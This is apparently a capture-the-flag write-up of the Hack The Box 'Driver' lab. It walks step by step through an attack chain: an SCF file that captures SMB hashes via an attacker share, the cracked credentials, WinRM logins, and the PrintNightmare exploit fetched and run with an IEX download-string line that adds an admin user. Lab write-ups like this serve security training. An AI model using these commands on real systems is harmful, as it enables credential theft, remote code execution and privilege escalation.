---
layout: post
title: HTB Machine - Driver
subtitle: Writeup
cover-img: /assets/img/Scifi.1920x1080.jpg
thumbnail-img: /assets/img/Scifi.1920x1080.jpg
share-img: /assets/img/Scifi.1920x1080.jpg
tags: [ HTB, Malicious DLL, Hack the Box]
---
# there is a webpage that we can access with admin:admin credentials.

#Inside the menus there is an option to upload files. When a file that is share locally is open an icon can be loaded from a source, the user will need to authn to get that icon and we can capture those credentials to crack later. We create the scf file with the info below, the ICO file does not have to exist: 

[Shell]
Command=2
IconFile=\\10.10.14.3\SMBfolder\loquesea.ico
[Taskbar]
Command=ToggleDesktop


# Set impacket to spoof a SMB server and capture authN details.

impacket-smbserver SMBfolder $(pwd) -smb2support

# capture the credentials of tony and crack with john

tony:liltony

# Validate the user with crackmapexec (+ left to the user)

crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'

# Validate that the user could access through winrm

crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'

# the user is part of remote mgmt users because it says (pwn3d!) in the previous output. WE could connect with winRM

evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'

# once inside. verify user is part of Remote MGMt users with:

net user tony

# and we get user flag. After we cannot gain access to the admin folder so we need to escalate priviledges. We check the priveleges for our user with:

whoami /priv
whoami /all

# How to get to the point you know the printer is the vulnerability?

#We can exploit a printer vuln, a PS script will create a user via a dll. first we need the script. Download it to the attack machine and serve it via a python server.

https://github.com/calebstewart/CVE-2021-1675

#download to the windows machine with the following command:

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/CVE-2021-1675.ps1')

#to execute run the following:

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 

# this will create a user, you can double check with "net user" command. After that in the attacking machine verify the user exist and it works:

crackmapexec winrm 10.10.11.106 -u 'john' -p 'SuperSecure'

#then winrm with it

evil-winrm 10.10.11.106 -u 'john' -p 'SuperSecure'


